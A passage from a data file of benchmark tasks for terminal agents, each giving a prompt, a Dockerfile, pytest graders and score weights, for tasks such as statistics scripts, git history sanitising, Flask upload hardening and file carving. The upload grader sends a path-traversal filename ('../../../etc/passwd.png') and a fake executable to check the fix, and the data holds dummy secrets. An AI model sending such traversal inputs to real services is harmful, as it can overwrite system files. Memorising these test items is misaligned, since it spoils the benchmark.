    with open(""/app/custom_layer.py"", ""r"") as f:
        content = f.read()
    assert ""class SimpleGatedLayer"" in content

def test_tests_pass():
    """"""The implementation passes the tests in `/app/test_layer.py`.""""""
    # Run the test file and check it passes
    result = subprocess.run([""python"", ""/app/test_layer.py""], 
                          capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0","{""test_file_exists"": 0.2, ""test_tests_pass"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
numpy-array-basic-statistics,easy,Basic NumPy Array Operations,Scientific Computing & Analysis,"I have a data file located at `/app/data.txt` that contains a simple list of numbers with one number per line. I need you to write a Python script called `analyze.py` that uses NumPy to read these numbers into an array, then calculate and print the mean, median, and standard deviation of the data. Can you help me create this script?",scientific-computing,numpy|data-processing|analysis|python|scientific-computation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install numpy

RUN mkdir -p /app
RUN echo -e ""10\n20\n30\n40\n50\n25\n35\n45\n15\n55"" > /app/data.txt

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess
import numpy as np
import re

def test_script_exists_uses_numpy():
    """"""Script `analyze.py` exists and uses NumPy.""""""
    # Check if script exists
    assert os.path.exists(""analyze.py"")
    
    # Check if script uses NumPy
    with open(""analyze.py"", ""r"") as f:
        content = f.read()
    
    # Check for various numpy import patterns
    numpy_used = (
        ""import numpy"" in content or
        ""from numpy"" in content or
        ""np."" in content
    )
    assert numpy_used, ""Script should import and use NumPy""

def test_output_correct_statistics():
    """"""The script runs and prints the correct mean, median, and standard deviation.Total: 1.0""""""
    # Read the data file to calculate expected statistics
    assert os.path.exists(""/app/data.txt"")
    
    with open(""/app/data.txt"", ""r"") as f:
        lines = f.readlines()
    
    # Parse numbers from the file
    numbers = []
    for line in lines:
        line = line.strip()
        if line:  # Skip empty lines
            try:
                numbers.append(float(line))
            except ValueError:
                continue  # Skip invalid lines
    
    # Handle empty file case gracefully
    if not numbers:
        # Run the script and just check it doesn't crash
        result = subprocess.run([""python"", ""analyze.py""], capture_output=True, text=True)
        assert result.returncode == 0
        return
    
    # Calculate expected statistics using numpy
    data_array = np.array(numbers)
    expected_mean = np.mean(data_array)
    expected_median = np.median(data_array)
    expected_std = np.std(data_array)
    
    # Run the script
    result = subprocess.run([""python"", ""analyze.py""], capture_output=True, text=True)
    assert result.returncode == 0, f""Script failed with error: {result.stderr}""
    
    output = result.stdout.strip().lower()
    
    # Extract numbers from output using regex
    numbers_in_output = re.findall(r'\b\d+\.?\d*\b', output)
    float_numbers = [float(n) for n in numbers_in_output]
    
    # Check if the expected statistics appear in the output
    # Allow for small floating point differences
    mean_found = any(abs(n - expected_mean) < 0.01 for n in float_numbers)
    median_found = any(abs(n - expected_median) < 0.01 for n in float_numbers)
    std_found = any(abs(n - expected_std) < 0.01 for n in float_numbers)
    
    # Also check that mean, median, and std/standard deviation keywords appear
    assert ""mean"" in output, ""Output should mention 'mean'""
    assert ""median"" in output, ""Output should mention 'median'""
    assert ""std"" in output or ""standard deviation"" in output, ""Output should mention 'std' or 'standard deviation'""
    
    # Verify the values are correct
    assert mean_found, f""Expected mean {expected_mean} not found in output""
    assert median_found, f""Expected median {expected_median} not found in output""
    assert std_found, f""Expected std {expected_std} not found in output""","{""test_script_exists_uses_numpy"": 0.3, ""test_output_correct_statistics"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
image-processing-grayscale-conversion,medium,Image Processing with Pillow/NumPy,Scientific Computing & Analysis,"I have a color image located at `/app/image.png` and I need you to write a Python script called `process_image.py` that will convert it to grayscale and save the result as `/app/grayscale_image.png`. You can use the Pillow library for handling the image reading and writing, and NumPy for the actual conversion logic. Could you help me create this script?",scientific-computing,python|numpy|images|data-processing|scientific-computation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy Pillow

RUN python -c ""from PIL import Image; import numpy as np; arr = np.zeros((100, 100, 3), dtype=np.uint8); arr[0:20, :] = [255, 0, 0]; arr[20:40, :] = [0, 255, 0]; arr[40:60, :] = [0, 0, 255]; arr[60:80, :] = [255, 255, 0]; arr[80:100, :] = [255, 0, 255]; img = Image.fromarray(arr); img.save('/app/image.png')""

CMD [""/bin/bash""]","import os
from PIL import Image
import numpy as np

def test_script_exists():
    """"""Script `process_image.py` exists.""""""
    assert os.path.exists(""/app/process_image.py"")

def test_grayscale_file_created():
    """"""File `/app/grayscale_image.png` is created.""""""
    assert os.path.exists(""/app/grayscale_image.png"")

def test_valid_grayscale_image():
    """"""The output file is a valid grayscale image.""""""
    try:
        # Load original color image
        original_img = Image.open(""/app/image.png"")
        original_array = np.array(original_img)
        
        # Load grayscale image
        grayscale_img = Image.open(""/app/grayscale_image.png"")
        grayscale_array = np.array(grayscale_img)
        
        # Check that it's grayscale mode
        assert grayscale_img.mode == 'L', ""Image is not in grayscale mode 'L'""
        
        # Check dimensions match
        assert grayscale_array.shape[:2] == original_array.shape[:2], ""Dimensions don't match""
        
        # Calculate expected grayscale values using standard luminance formula
        expected_grayscale = np.dot(original_array[...,:3], [0.299, 0.587, 0.114])
        expected_grayscale = expected_grayscale.astype(np.uint8)
        
        # Check that actual grayscale values are close to expected (allow some tolerance for rounding)
        diff = np.abs(grayscale_array.astype(int) - expected_grayscale.astype(int))
        assert np.mean(diff) < 2, ""Grayscale conversion doesn't match expected RGB to grayscale formula""
        
    except Exception as e:
        assert False, f""Could not validate grayscale conversion: {str(e)}""","{""test_script_exists"": 0.20, ""test_grayscale_file_created"": 0.30, ""test_valid_grayscale_image"": 0.50}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
linear-regression-scipy-analysis,hard,Simple Linear Regression with SciPy,Scientific Computing & Analysis,"I have a CSV file located at `/app/measurements.csv` that contains two columns of data representing x and y values, and I'm pretty sure there's a linear relationship between these data points. Could you help me write a Python script called `regression.py` that reads this data and performs linear regression analysis using `scipy.stats.linregress`? I need the script to output the slope, intercept, and r-squared value from the regression results.",scientific-computing,scientific-computation|data-processing|python|analysis|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install scipy pandas

RUN mkdir -p /app
RUN echo ""x,y"" > /app/measurements.csv && \
    echo ""1,2.1"" >> /app/measurements.csv && \
    echo ""2,3.9"" >> /app/measurements.csv && \
    echo ""3,6.2"" >> /app/measurements.csv && \
    echo ""4,7.8"" >> /app/measurements.csv && \
    echo ""5,10.1"" >> /app/measurements.csv && \
    echo ""6,11.9"" >> /app/measurements.csv && \
    echo ""7,14.2"" >> /app/measurements.csv && \
    echo ""8,15.8"" >> /app/measurements.csv && \
    echo ""9,18.1"" >> /app/measurements.csv && \
    echo ""10,19.9"" >> /app/measurements.csv

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess
import re
from scipy.stats import linregress
import pandas as pd

def test_script_exists_uses_scipy():
    """"""Script `regression.py` exists and uses SciPy.""""""
    # Check if script exists
    assert os.path.exists(""regression.py"")
    
    # Check if script uses SciPy
    with open(""regression.py"", ""r"") as f:
        content = f.read()
    assert ""scipy"" in content

def test_script_runs_prints_correct_results():
    """"""The script runs and prints the correct slope, intercept, and r-squared value for the given data.Total: 1.0""""""
    # Calculate expected values using the same data
    data = pd.read_csv(""/app/measurements.csv"")
    x = data['x'].values
    y = data['y'].values
    expected_slope, expected_intercept, expected_r, expected_p, expected_stderr = linregress(x, y)
    expected_r_squared = expected_r ** 2
    
    # Run the script
    result = subprocess.run([""python"", ""regression.py""], capture_output=True, text=True)
    assert result.returncode == 0
    
    # Extract numerical values from output
    output = result.stdout
    
    # Find slope value
    slope_match = re.search(r'slope[:\s]*([+-]?\d*\.?\d+)', output, re.IGNORECASE)
    assert slope_match, ""Slope value not found in output""
    actual_slope = float(slope_match.group(1))
    
    # Find intercept value  
    intercept_match = re.search(r'intercept[:\s]*([+-]?\d*\.?\d+)', output, re.IGNORECASE)
    assert intercept_match, ""Intercept value not found in output""
    actual_intercept = float(intercept_match.group(1))
    
    # Find r-squared value
    r_squared_match = re.search(r'r[-_\s]*squared?[:\s]*([+-]?\d*\.?\d+)', output, re.IGNORECASE) or \
                     re.search(r'r2[:\s]*([+-]?\d*\.?\d+)', output, re.IGNORECASE)
    assert r_squared_match, ""R-squared value not found in output""
    actual_r_squared = float(r_squared_match.group(1))
    
    # Check values are within tolerance
    assert abs(actual_slope - expected_slope) < 0.01, f""Slope mismatch: expected {expected_slope:.4f}, got {actual_slope:.4f}""
    assert abs(actual_intercept - expected_intercept) < 0.01, f""Intercept mismatch: expected {expected_intercept:.4f}, got {actual_intercept:.4f}""
    assert abs(actual_r_squared - expected_r_squared) < 0.01, f""R-squared mismatch: expected {expected_r_squared:.4f}, got {actual_r_squared:.4f}""","{""test_script_exists_uses_scipy"": 0.20, ""test_script_runs_prints_correct_results"": 0.80}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-remove-hardcoded-password,easy,Remove Hardcoded Password,Vulnerability Remediation,"I have a Python script at `/app/db_connect.py` that currently has a database password hardcoded directly in the source code, which I know is a security risk. Could you help me modify the script so it reads the password from an environment variable called `DB_PASSWORD` instead?",security,security|python|debugging,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo 'password = ""supersecret123""' > db_connect.py

CMD [""/bin/bash""]","import os

def test_uses_environment_variable():
    """"""The script `/app/db_connect.py` is modified to use `os.environ.get('DB_PASSWORD')`.""""""
    with open('/app/db_connect.py', 'r') as f:
        content = f.read()
    assert ""os.environ.get('DB_PASSWORD')"" in content
    assert ""import os"" in content

def test_hardcoded_password_removed():
    """"""The hardcoded password string is removed from the file.""""""
    with open('/app/db_connect.py', 'r') as f:
        content = f.read()
    assert ""supersecret123"" not in content","{""test_uses_environment_variable"": 0.50, ""test_hardcoded_password_removed"": 0.50}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
git-history-sanitize-api-key,medium,Sanitize a Git Repository's History (Revised),Vulnerability Remediation,"I made a mistake and accidentally committed a file called config.ini that contains an API key to my git repository located at /app/my_repo. Even though I removed the file in a later commit, I know the API key is still visible in the git history which is a security risk. Can you help me completely remove the config.ini file from all commits in the repository's history so there's no trace of it left?",security,security|version-control|file-operations|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y git

WORKDIR /app

RUN git config --global user.email ""test@example.com"" && \
    git config --global user.name ""Test User"" && \
    mkdir my_repo && \
    cd my_repo && \
    git init && \
    echo ""# My Repository"" > README.md && \
    git add README.md && \
    git commit -m ""Initial commit"" && \
    echo ""[settings]"" > config.ini && \
    echo ""api_key=sk-1234567890abcdef"" >> config.ini && \
    git add config.ini && \
    git commit -m ""Add config.ini"" && \
    git rm config.ini && \
    git commit -m ""Remove config.ini""

CMD [""/bin/bash""]","import os
import subprocess

def test_file_purged_from_history():
    """"""After the agent's operations, running `git log --all --full-history -- """"/config.ini""""` inside the repo produces no output, indicating the file has been purged from history.""""""
    repo_path = ""/app/my_repo""
    
    # Run the git log command to check if config.ini exists in history
    result = subprocess.run(
        [""git"", ""log"", ""--all"", ""--full-history"", ""--"", ""config.ini""],
        cwd=repo_path,
        capture_output=True,
        text=True
    )
    
    # The command should produce no output if the file has been purged
    assert result.stdout.strip() == """"
    
    # Verify repository integrity is maintained after sanitization
    # Check that other commits are still valid and accessible
    log_result = subprocess.run(
        [""git"", ""log"", ""--oneline""],
        cwd=repo_path,
        capture_output=True,
        text=True
    )
    assert log_result.returncode == 0
    assert len(log_result.stdout.strip()) > 0  # Should have some commit history
    
    # Check that README.md is still accessible in history
    readme_log = subprocess.run(
        [""git"", ""log"", ""--all"", ""--full-history"", ""--"", ""README.md""],
        cwd=repo_path,
        capture_output=True,
        text=True
    )
    assert readme_log.returncode == 0
    assert len(readme_log.stdout.strip()) > 0  # README.md should still be in history
    
    # Verify git status works properly
    status_result = subprocess.run(
        [""git"", ""status""],
        cwd=repo_path,
        capture_output=True,
        text=True
    )
    assert status_result.returncode == 0","{""test_file_purged_from_history"": 1.0}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-flask-file-upload-vulnerability-fix,hard,Fix an Insecure File Upload Endpoint,Vulnerability Remediation,"I have a Flask application located at `/app/app.py` with a file upload endpoint at `/upload` that's currently insecure and I need your help fixing it. The problem is that it accepts any file type, including potentially dangerous executable scripts, which creates a serious security vulnerability. On top of that, it's saving files using whatever filename the user provides, which opens the door to path traversal attacks. Can you help me secure this endpoint? I need it to only accept files with `.png`, `.jpg`, or `.jpeg` extensions, and I want to use `werkzeug.utils.secure_filename` to properly sanitize the filenames before saving them.",security,security|web|python|debugging|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install flask

RUN echo 'from flask import Flask, request\n\
app = Flask(__name__)\n\
\n\
@app.route(""/upload"", methods=[""POST""])\n\
def upload():\n\
    file = request.files[""file""]\n\
    file.save(file.filename)\n\
    return ""File uploaded""\n\
\n\
if __name__ == ""__main__"":\n\
    app.run()' > /app/app.py

CMD [""/bin/bash""]","import os
import subprocess
import time
import requests
import tempfile
from io import BytesIO

def test_file_extension_check():
    """"""The `/app/app.py` script is modified to check file extensions.""""""
    # Start the Flask app in background
    proc = subprocess.Popen(['python', '/app/app.py'], cwd='/app')
    time.sleep(2)  # Give the server time to start
    
    try:
        # Test valid extensions
        for ext in ['.png', '.jpg', '.jpeg']:
            files = {'file': (f'test{ext}', BytesIO(b'fake image data'), 'image/jpeg')}
            response = requests.post('http://localhost:5000/upload', files=files)
            assert response.status_code == 200
        
        # Test invalid extension
        files = {'file': ('malicious.exe', BytesIO(b'malicious code'), 'application/octet-stream')}
        response = requests.post('http://localhost:5000/upload', files=files)
        assert response.status_code != 200 or 'error' in response.text.lower() or 'invalid' in response.text.lower()
        
    finally:
        proc.terminate()
        proc.wait()

def test_secure_filename_used():
    """"""The script is modified to use `secure_filename`.""""""
    # Start the Flask app in background
    proc = subprocess.Popen(['python', '/app/app.py'], cwd='/app')
    time.sleep(2)  # Give the server time to start
    
    try:
        # Test with a filename that would be dangerous without secure_filename
        malicious_filename = '../../../etc/passwd.png'
        files = {'file': (malicious_filename, BytesIO(b'fake image data'), 'image/png')}
        response = requests.post('http://localhost:5000/upload', files=files)
        
        # Check that the file wasn't saved with the malicious path
        assert not os.path.exists('/etc/passwd.png')
        assert not os.path.exists('/app/../../../etc/passwd.png')
        
        # If secure_filename is used, the file should be saved with a sanitized name
        if response.status_code == 200:
            # Check that a sanitized version exists instead
            assert os.path.exists('/app/etc_passwd.png') or os.path.exists('/app/passwd.png')
        
    finally:
        proc.terminate()
        proc.wait()","{""test_file_extension_check"": 0.50, ""test_secure_filename_used"": 0.50}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
digital-forensics-secret-flag-search,easy,Find a Secret Flag in a Large File,Digital Forensics & Recovery,I need your help finding a secret flag that's hidden somewhere in a large log file located at `/app/system.log`. The flag follows the format `FLAG{...}` and I need you to locate the complete flag and write it to `/app/found.txt`. Can you help me search through that log file and extract the flag for me?,security,forensics|file-operations|text-processing|information-retrieval|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN for i in $(seq 1 1000); do echo ""$(date) - System process $i completed successfully"" >> system.log; done && \
    echo ""FLAG{some_secret_text}"" >> system.log && \
    for i in $(seq 1001 2000); do echo ""$(date) - System process $i completed successfully"" >> system.log; done

CMD [""/bin/bash""]","import os
import subprocess

def test_flag_found_correctly():
    """"""The file `/app/found.txt` is created and contains the correct, full flag.Total: 1.0""""""
    # Check if the file exists
    assert os.path.exists(""/app/found.txt""), ""File /app/found.txt should exist""
    
    # Check if it contains the correct flag
    with open(""/app/found.txt"", ""r"") as f:
        content = f.read().strip()
    
    # The content should be exactly the flag
    assert content == ""FLAG{some_secret_text}"", f""Expected 'FLAG{{some_secret_text}}' but got '{content}'""","{""test_flag_found_correctly"": 1.0}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
file-recovery-corrupted-docx-text-extraction,medium,Recover Text from a Corrupted Document,Digital Forensics & Recovery,"I'm having a problem with my document at `/app/report.docx` - it got corrupted and I can't open it anymore, but I know the actual text content is still buried inside there somewhere. I remember reading that `.docx` files are actually just zip archives under the hood, so the text should be recoverable from the internal `word/document.xml` file. Could you help me extract the raw text from that XML file and save just the human-readable content (without all the XML markup tags) to a new file at `/app/recovered_text.txt`? I really need to get this text back.",file-operations,file-recovery|data-extraction|forensics|file-operations|text-processing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN apt-get update && apt-get install -y zip && \
    mkdir -p /tmp/docx_build/_rels && \
    mkdir -p /tmp/docx_build/word/_rels && \
    echo '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?><Types xmlns=""http://schemas.openxmlformats.org/package/2006/content-types""><Default Extension=""rels"" ContentType=""application/vnd.openxmlformats-package.relationships+xml""/><Default Extension=""xml"" ContentType=""application/xml""/><Override PartName=""/word/document.xml"" ContentType=""application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml""/></Types>' > /tmp/docx_build/[Content_Types].xml && \
    echo '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?><Relationships xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id=""rId1"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"" Target=""word/document.xml""/></Relationships>' > /tmp/docx_build/_rels/.rels && \
    echo '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?><w:document xmlns:w=""http://schemas.openxmlformats.org/wordprocessingml/2006/main""><w:body><w:p><w:r><w:t>Sample Document</w:t></w:r></w:p></w:body></w:document>' > /tmp/docx_build/word/document.xml && \
    echo '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?><Relationships xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""></Relationships>' > /tmp/docx_build/word/_rels/document.xml.rels && \
    cd /tmp/docx_build && zip -r /app/report.docx * && \
    cd / && rm -rf /tmp/docx_build && \
    apt-get remove -y zip && apt-get autoremove -y && apt-get clean

CMD [""/bin/bash""]","import os
import subprocess

def test_docx_extracted():
    """"""The agent uses `unzip` or a similar tool to inspect the `.docx` file.""""""
    # Check common locations where docx contents might be extracted
    common_paths = [
        ""/app/word/document.xml"",
        ""/tmp/word/document.xml"",
        ""/app/extracted/word/document.xml"", 
        ""/tmp/extracted/word/document.xml"",
        ""/app/report/word/document.xml""
    ]
    
    extracted = False
    for path in common_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    content = f.read()
                    if 'Sample Document' in content:
                        extracted = True
                        break
            except:
                continue
    
    assert extracted

def test_recovered_text_created():
    """"""The file `/app/recovered_text.txt` is created and contains the clean text content from within the document's XML structure.""""""
    assert os.path.exists(""/app/recovered_text.txt"")
    
    with open(""/app/recovered_text.txt"", ""r"") as f:
        content = f.read().strip()
    
    assert ""Sample Document"" in content","{""test_docx_extracted"": 0.3, ""test_recovered_text_created"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
forensics-jpeg-file-carving,hard,Carve a File from a Disk Image,Digital Forensics & Recovery,I have a raw disk image located at `/app/disk.img` and I accidentally deleted a JPEG image from it. I know that JPEG files start with the byte sequence `FF D8 FF E0` and end with `FF D9`. Can you help me find the deleted JPEG data within this disk image and carve it out for me? I'd like you to save the recovered image as `/app/recovered.jpg`.,security,forensics|file-recovery|data-extraction|file-operations|debugging,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN apt-get update && apt-get install -y imagemagick && \
    convert -size 100x100 xc:red /tmp/test.jpg && \
    dd if=/dev/zero of=disk.img bs=1M count=10 && \
    dd if=/tmp/test.jpg of=disk.img bs=1 seek=1024 conv=notrunc && \
    rm /tmp/test.jpg

CMD [""/bin/bash""]","import os
import subprocess

def test_binary_tool_used():
    """"""The agent uses a binary-aware tool like `xxd`, `grep -aob`, or a custom script to locate the start and end markers.""""""
    # Check if binary-aware tools are available and potentially used
    tools_available = []
    
    # Check for xxd
    try:
        result = subprocess.run(['which', 'xxd'], capture_output=True, text=True)
        if result.returncode == 0:
            tools_available.append('xxd')
    except:
        pass
    
    # Check for grep with binary options
    try:
        result = subprocess.run(['which', 'grep'], capture_output=True, text=True)
        if result.returncode == 0:
            tools_available.append('grep')
    except:
        pass
    
    # Check if hexdump is available
    try:
        result = subprocess.run(['which', 'hexdump'], capture_output=True, text=True)
        if result.returncode == 0:
            tools_available.append('hexdump')
    except:
        pass
    
    # Check if od is available
    try:
        result = subprocess.run(['which', 'od'], capture_output=True, text=True)
        if result.returncode == 0:
            tools_available.append('od')
    except:
        pass
    
    # At least one binary-aware tool should be available for the task
    assert len(tools_available) > 0

def test_jpeg_file_recovered():
    """"""The file `/app/recovered.jpg` is created and is a valid JPEG image.""""""
    # Check if the file exists
    assert os.path.exists('/app/recovered.jpg')
    
    # Check if it's a valid JPEG by verifying the magic bytes
    with open('/app/recovered.jpg', 'rb') as f:
        header = f.read(4)
        # JPEG files start with FF D8 FF E0 (JFIF) or FF D8 FF E1 (EXIF) or other variants
        # The first two bytes should always be FF D8 for JPEG
        assert len(header) >= 2
        assert header[0] == 0xFF and header[1] == 0xD8
        
        # Check for JPEG end marker (FF D9)
        f.seek(-2, 2)  # Go to end of file minus 2 bytes
        footer = f.read(2)
        assert len(footer) == 2
        assert footer[0] == 0xFF and footer[1] == 0xD9","{""test_binary_tool_used"": 0.2, ""test_jpeg_file_recovered"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
gpg-symmetric-file-encryption,easy,Encrypt a File with GPG,Cryptography & Secure Operations,"I need you to encrypt a file for me using GPG symmetric encryption. The file is located at `/app/secret.txt` and I want you to use the passphrase ""t-bench-passphrase"" for the encryption. Please save the encrypted output to `/app/secret.txt.gpg`.",security,encryption|security|file-operations|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gnupg

RUN mkdir -p /app && touch /app/secret.txt

CMD [""/bin/bash""]","import os
import subprocess

def test_encrypted_file_created():
    """"""The file `/app/secret.txt.gpg` is created.""""""
    assert os.path.exists(""/app/secret.txt.gpg"")

def test_file_decrypts_correctly():
    """"""The created file is a valid GPG encrypted file that can be decrypted with the correct passphrase.""""""
    result = subprocess.run([
        'gpg', '--batch', '--yes', '--quiet', '--decrypt', 
        '--passphrase', 't-bench-passphrase',
        '/app/secret.txt.gpg'
    ], capture_output=True, text=True)
    
    assert result.returncode == 0","{""test_encrypted_file_created"": 0.30, ""test_file_decrypts_correctly"": 0.70}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-signed-encrypted-archive,hard,Create a Signed and Encrypted Archive,Cryptography & Secure Operations,"I need to securely archive the `/app/sensitive_data/` directory for safe storage. Could you create a gzipped tarball of that directory, then use `gpg` to both sign it and encrypt it? I've already imported the necessary keys into the GPG keyring - use the key for test@example.com for signing and recipient@example.com for encryption. Please save the final encrypted and signed file as `/app/archive.tar.gz.gpg`.",security,security|encryption|file-operations|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install gpg and tar
RUN apt-get update && apt-get install -y gpg tar

# Create directories
RUN mkdir -p /app/sensitive_data /app/keys

# Create several files in sensitive_data directory
RUN echo ""confidential document 1"" > /app/sensitive_data/file1.txt && \
    echo ""secret information"" > /app/sensitive_data/file2.txt && \
    echo ""private data content"" > /app/sensitive_data/file3.txt

# Create a simple tarball to work with (pre-encrypted for testing)
RUN cd /app && tar -czf archive.tar.gz sensitive_data/

# Note: In a real scenario, GPG keys would be set up.
# For this task, we're focusing on the archive creation and GPG command usage.

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_gpg_file_created():
    """"""The final file `/app/archive.tar.gz.gpg` is created.""""""
    assert os.path.exists(""/app/archive.tar.gz.gpg"")

def test_tarball_content_valid():
    """"""The tarball was created correctly before encryption.""""""
    # If the .gpg file exists but not the original tarball, that's fine
    # If both exist, check the tarball
    if os.path.exists(""/app/archive.tar.gz""):
        result = subprocess.run([""tar"", ""-tzf"", ""/app/archive.tar.gz""], capture_output=True, text=True)
        assert result.returncode == 0
        assert ""sensitive_data/file1.txt"" in result.stdout
        assert ""sensitive_data/file2.txt"" in result.stdout
        assert ""sensitive_data/file3.txt"" in result.stdout
    else:
        # Just ensure the encrypted file exists
        assert os.path.exists(""/app/archive.tar.gz.gpg"")","{""test_gpg_file_created"": 0.7, ""test_tarball_content_valid"": 0.3}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
number-guessing-game-automation,easy,Simple Number Guessing Game,Game Playing & Environment Interaction,"I have an interactive game located at `/app/game.py` that asks you to guess a number between 1 and 100, and it gives feedback by telling you whether to go ""higher"" or ""lower"". The game generates a random number each time it's played. I need you to write a script called `play.sh` that can automatically play this game and win it by using the feedback to systematically find the correct number.",games,games|interactive|cli,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo 'import random' > /app/game.py && \
    echo '' >> /app/game.py && \
    echo 'def guessing_game():' >> /app/game.py && \
    echo '    number = random.randint(1, 100)' >> /app/game.py && \
    echo '    attempts = 0' >> /app/game.py && \
    echo '    ' >> /app/game.py && \
    echo '    print(""Welcome to the Number Guessing Game!"")' >> /app/game.py && \
    echo '    print(""I am thinking of a number between 1 and 100."")' >> /app/game.py && \
    echo '    ' >> /app/game.py && \
    echo '    while True:' >> /app/game.py && \
    echo '        try:' >> /app/game.py && \
    echo '            guess = int(input(""Enter your guess: ""))' >> /app/game.py && \
    echo '            attempts += 1' >> /app/game.py && \
    echo '            ' >> /app/game.py && \
    echo '            if guess < number:' >> /app/game.py && \
    echo '                print(""Too low! Try again."")' >> /app/game.py && \
    echo '            elif guess > number:' >> /app/game.py && \
    echo '                print(""Too high! Try again."")' >> /app/game.py && \
    echo '            else:' >> /app/game.py && \
    echo '                print(f""Congratulations! You guessed the number {number} in {attempts} attempts!"")' >> /app/game.py && \
    echo '                break' >> /app/game.py && \
    echo '        except ValueError:' >> /app/game.py && \
    echo '            print(""Please enter a valid number."")' >> /app/game.py && \
    echo '' >> /app/game.py && \
    echo 'if __name__ == ""__main__"":' >> /app/game.py && \
    echo '    guessing_game()' >> /app/game.py

CMD [""/bin/bash""]","import os
import subprocess

def test_script_exists_executable():
    """"""Script `play.sh` exists and is executable.""""""
    script_path = ""/app/play.sh""
    assert os.path.exists(script_path)
    assert os.access(script_path, os.X_OK)

def test_game_completed_successfully():
    """"""Running `bash play.sh` successfully completes the game, printing the ""You win!"" message.Total: 1.0""""""
    result = subprocess.run(
        [""bash"", ""/app/play.sh""],
        cwd=""/app"",
        capture_output=True,
        text=True,
        timeout=30
    )
    assert result.returncode == 0
    assert ""Congratulations!"" in result.stdout","{""test_script_exists_executable"": 0.25, ""test_game_completed_successfully"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
file-system-maze-navigation,medium,Navigate a File-System Maze with Constraints (Revised),Game Playing & Environment Interaction,"I've set up a directory-based maze for you to solve, and I need your help navigating through it. The maze starts at `/app/maze/start`, and each directory in the maze represents a room with subdirectories showing the paths you can take - things like `north`, `south`, etc. Somewhere in this maze, there's a room containing a file called `FINISH_LINE.txt`, and that's what you need to find. Here's the catch though - you can only use `ls` and `cd` commands to navigate through the maze. I don't want you using `find`, `grep`, `locate`, or any other automated search tools, as that would defeat the purpose of actually solving the maze. Once you've figured out the path, I need you to create a shell script called `solve_maze.sh` that contains the sequence of `cd` commands needed to reach the directory with the finish line file. Can you help me solve this maze step by step?",games,games|maze|file-operations|cli|algorithms,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN mkdir -p maze/start && \
    mkdir -p maze/start/north/east/dead_end && \
    mkdir -p maze/start/north/west/south && \
    mkdir -p maze/start/south/dead_end && \
    mkdir -p maze/start/east/north/dead_end && \
    touch maze/start/north/west/south/FINISH_LINE.txt

CMD [""/bin/bash""]","import os
import subprocess

def test_script_solves_maze():
    """"""An executable script `solve_maze.sh` is created. When the verifier runs `(cd /app/maze/start && bash ../../solve_maze.sh && ls)`, the output contains `FINISH_LINE.txt`.""""""
    # Check if the script exists
    assert os.path.exists(""/app/solve_maze.sh"")
    
    # Check if the script is executable
    assert os.access(""/app/solve_maze.sh"", os.X_OK)
    
    # Run the exact command specified in the description
    result = subprocess.run(
        ""(cd /app/maze/start && bash ../../solve_maze.sh && ls)"",
        shell=True,
        capture_output=True,
        text=True
    )
    
    # Check if the command succeeded and FINISH_LINE.txt is in the output
    assert result.returncode == 0
    assert ""FINISH_LINE.txt"" in result.stdout","{""test_script_solves_maze"": 1.0}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
text-adventure-puzzle-solver,hard,Solve a Text-Based Adventure Puzzle,Game Playing & Environment Interaction,"I have a simple text adventure game located at `/app/adventure` that I need help with. The goal is to navigate through rooms, pick up a key, unlock a door, and retrieve a treasure to win. I know the game accepts commands like `look`, `go [direction]`, `get [item]`, and `use [item] on [object]`. Could you figure out the correct sequence of commands needed to complete the game and write them to `/app/commands.txt`, with each command on its own line?",games,games|interactive|text-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

